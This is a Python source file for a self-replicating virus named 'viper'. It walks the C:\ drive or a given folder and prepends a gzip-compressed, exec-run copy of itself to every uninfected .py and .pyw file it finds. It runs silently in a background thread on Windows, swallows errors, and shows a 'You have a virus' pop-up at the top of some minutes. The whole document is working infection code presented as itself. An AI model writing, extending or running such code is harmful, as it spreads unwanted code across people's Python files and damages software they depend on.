###START###
import os
import platform
import threading
import datetime
import sys
import gzip

def viper_verif_infect(path):
    try:
        with open(path) as f:
            dat = f.read()
        if "# # #START# # #".replace(" ","") in dat and "# # #END# # #".replace(" ","") in dat:
            return True
        else:
            return False
    except:
        return False
    
def viper_infection_lookup():
    for path, subdirs, files in os.walk(INFECTION_DIRECTORY):
        for name in files:
            if name.endswith(".py") or name.endswith(".pyw"):
                #print(os.path.join(path,name))
                if not viper_verif_infect(os.path.join(path,name)):
                    if os.path.join(path,name) is not sys.argv[0] and not "Lib" in path:
                        viper_infect(os.path.join(path,name))
                    elif os.path.join(path,name) is not sys.argv[0] and "site-packages" in path:
                        viper_infect(os.path.join(path,name))
def viper_infect(path):
    try:
        with open(path) as f:
            data = f.read()
        data = "# # #START# # #\n".replace(" ","")+f"import gzip\nexec(gzip.decompress({str(viper_data)}))"+"\n# # #END# # #\n".replace(" ","") + data
        with open(path,"w") as f:
            f.write(data)
    except:
        pass
def viper_payload():
    MessageBox = ctypes.windll.user32.MessageBoxW
    MessageBox(None,"Oh No! Looks like you have a virus!","You have a virus",0)
                
def viper():
    try:
        now = datetime.datetime.now()
        if now.second == 0:
            viper_payload()
        viper_infection_lookup()
    except:
        pass
with open(sys.argv[0],'r') as f:
    viper_data = f.read().split("# # #START# # #".replace(" ",""))[1].split("# # #END# # #".replace(" ",""))[0]
    if len(viper_data) > 2100 and "virus" in sys.argv[0]:
        #Only do this if original virus.py
        viper_data = "\n".join([v for v in viper_data.splitlines() if not v.startswith("#") and v.replace(" ","") != ""])#Remove blanks
        viper_data = gzip.compress(viper_data.encode())
        #Now it is bytes
    else:
        
        viper_data = ("b'"+viper_data.splitlines()[2][23:-3].encode("unicode_escape").decode("latin1")+"'").replace("\\\\","\\")
INFECTION_DIRECTORY = "C:\\"
if len(sys.argv) >= 2 and os.path.isdir(sys.argv[1]):
    INFECTION_DIRECTORY = sys.argv[1]     
WIN32 = platform.system() == "Windows"
if WIN32:
    import ctypes
    threading.Thread(target=viper).start()
###END###
